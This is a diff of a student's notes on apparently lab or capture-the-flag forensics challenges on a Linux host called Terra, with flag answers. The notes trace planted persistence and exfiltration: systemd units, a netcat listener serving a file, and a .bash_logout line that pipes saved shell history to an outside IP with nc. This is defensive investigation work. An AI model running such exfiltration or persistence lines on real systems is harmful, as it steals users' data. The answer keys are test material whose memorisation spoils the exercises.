@@ -117,42 +117,32 @@ htop
  ANSWER====Mausan ukoul for avhe mubullat goth,witch_king,127.0.0.1:1234
  ```
  ---------------------------------------------
-Identify one of the human-readable file handles by the other program that creates a zombie process.
+# Identify one of the human-readable file handles by the other program that creates a zombie process.
 NOTE: Remember, zombie processes only live until the parent process kills them. Try monitoring the processes list with top or htop to find them.
-The flag is the text from one of the files it reads.
 htop, then f5 # this will show tree
 sudo lsof | grep 16238 #get the pid and do an LSOF of the pid to get the files
     cat /opt/mysoul
 ANSWER==and in the darkness bind them
------------------------------------------------
-Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.
-Task: Identify the command being ran and how it occurs.
-Flag format: command,how it occurs
- Machine: Terra
- /bin/bash -c netcat -lp 3389 < /tmp/NMAP_all_hosts.txt
-    netcat -lp 3389
- ssh gerviel@10.10.0.6
-#### 
+---------------------------------------------
+# Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.
+```shell
 go into etc/systemd/system
 find / -type f -exec grep -H '~/. bash_history ' {} \;
 sudo find / -type f -exec grep -H '.bash_history' {} \;
 # this command will look for a file that is tryign to look for a txt
 #Look through the below folders with the command unitl you find the string
-ANSWER==
+ANSWER==find /home -name \*.txt -exec cp {} /tmp \;,vestrisecreta.service
 service running, check systemd
 /bin/bash -c 'find /home -name \*.txt -exec cp {} /tmp \;,vestrisecreta.service
 /etc/systemd
 /etc/init.d
 /lib/systemd/system
+```
 ---------------------------------------------------
-Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.
-The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.
-Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.
-Flag format: command,persistence
-Machine: Terra
-###################### After viewing the below informaiton you can determine the command is being ran with the persistance being the .timer
+# Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts. The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes. Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.
+```shell
+#After viewing the below informaiton you can determine the command is being ran with the persistance being the .timer
 ANSWER==netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer
-
  found whatischaos.service
     [Unit]
     Description=Run a service
@@ -180,10 +170,45 @@ garviel@terra:/lib/systemd/system$ cat apache3.service
     RestartSec=10
     [Install]
     WantedBy=multi-user.target
+```
+-----------------------------------------------------
+Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff.
+Task: Identify how the command history is stolen from the machine.
+The flag is the file used to execute the commands, and where they are sent.
+Flag format: /absolute/path/to/file,IP:port
+Machine: Terra
+```shell
+cat /etc/passwd | grep -v nologin | grep -v false #view the /etc/passwd to view user with a /bin/false or "nologin. These users will not have an interactive login
+sudo find / -name .bash_history; #look for which users have a bash_history file
+#Output
+garviel@terra:~$ sudo find / -name .bash_history;
+/home/garviel/.bash_history
+/tmp/.bash_history
+/root/.bash_history
+#being search other psrts of the drive for a string containsd the .bash_history
+/etc/apparmor.d/abstractions/bash:  @{HOME}/.bash_history 
+grep -r ".bash_history" /lib     #System Libraries
+/srv     #Service Data Directory began looking for direcotires containsing the bash file
+#####
+start looking in the .bash_history files located in all users location
+grep -r ".bash_history" 
+grep -r ".bash_profile" 
+grep -r ".bash_login" 
+/tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2,12.54.37.8:12000
+
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+###Output
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
+nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
+/home/garviel/.bash_logout,12.54.37.8:12000
 
 
--------------------
- sudo lsof | grep 1059
 
+```
 
 
